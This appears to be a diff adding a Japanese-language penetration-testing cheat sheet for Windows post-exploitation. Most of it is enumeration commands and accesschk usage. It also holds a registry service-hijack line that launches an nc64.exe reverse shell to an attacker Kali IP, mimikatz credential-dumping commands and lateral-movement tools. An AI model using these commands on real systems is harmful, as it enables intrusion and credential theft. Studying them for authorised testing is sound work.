@@ -1,0 +1,78 @@
+#cmd
+curl <ダウンロード先のURL> -o <出力先のファイル名>
+
+#PS
+Invoke-WebRequest -Uri <ダウンロード先のURL> -OutFile <出力先のファイル名>
+
+#Kali
+/usr/share/windows-binariesにツールあり
+
+#アカウント情報
+whoami /all   -> ユーザ・権限情報
+net user      -> ローカルユーザアカウント情報
+wmic USERACCOUNT Get Domain,Name,Sid -> ローカルユーザアカウント情報
+
+#システム情報
+systeminfo    -> システム情報
+tasklist /SVC -> プロセス、PID、サービス名
+mountvol      -> マウントされているボリュームの列挙
+
+#ネットワーク情報
+ipconfig
+arp -A        -> ARPテーブルの表示
+route print   ->ネットワークルートの表示
+
+#ping sweep(ping応答がデフォルトだと帰ってこないことに注意)
+for /l %i in (1,1,255) do @ping -n 1 -w 100 192.168.22.%I | find "TTL="
+
+#ファイル検索
+dir /s *secret*
+
+#sysinternals
+https://docs.microsoft.com/en-us/sysinternals/
+
+#accesschk.exe:レジストリキー、プロセス、サービスを含むアクセス権を表示  -> icacls:ファイルやディレクトリのアクセス権を表示可能
+https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
+
+accesschk.exe -uwcvq "ユーザ名" *  -> 書き込み権限(を含む権限)があるサービスを全て列挙
+accesschk.exe "ユーザ名" -kuwvq "レジストリキー" -accepteula -> 書き込み権限(を含む権限)があるレジストリを特定のレジストリキー配下に対して列挙
+【オプション】
+-u:エラーを抑制する
+-w:書き込みアクセス権を持つオブジェクトのみを表示する
+-c:サービスの指定
+-k:レジストリキーの指定
+-v:詳細を表示
+-q:バナーを表示しない
+-accepteula:ライセンス許可用ポップアップの非表示（★初回起動時必須）
+
+【注目する設定】
+• SERVICE_CHANGE_CONFIG
+  サービスのCONFIGを変更可能:悪意あるプログラムをサービスとして登録可能
+• SERVICE_ALL_ACCESS
+  同上
+• KEY_ALL_ACCESS
+  レジストリキーを編集可能:サービスの設定値をレジストリから変更できてしまう
+
+【レジストリキーの書き換え】
+reg add <レジストリサブキー> /t <レジストリ値の形式> /v <レジストリキー> /d <レジストリ値> /f
+ex) リバースシェルの取得
+reg add HKLM¥SYSTEM¥CurrentControlSet¥Services¥evilsvc /t REG_EXPAND_SZ /v ImagePath /d "cmd /c ¥"C:¥inetpub¥wwwroot¥wordpress¥wpcontent¥themes¥twentytwentyone¥nc64.exe <Remote KaliのIP> <任意のポート> -e cmd¥"" /f
+
+【サービス関連のコマンド】
+sc query <サービス名>：サービスの情報表示
+sc config <サービス名>：サービスの構成変更
+sc start <サービス名>：サービスの開始
+sc stop <サービス名>：サービスの停止
+
+【Miimikatz】要システム権限
+privilege::debug ->　Privilege '20' OK と出ることを確認
+sekurlsa::logonpasswords -> NTLMハッシュの窃取
+
+【リモートサービスを使用した横展開】
+•　内部でSMBを使用するツール
+  1.PsExec
+  2.schtasks
+•　内部でDCOMを使用するツール
+  wmic
+•　内部でHTTP/HTTPSを使用するツール
+  WinRM
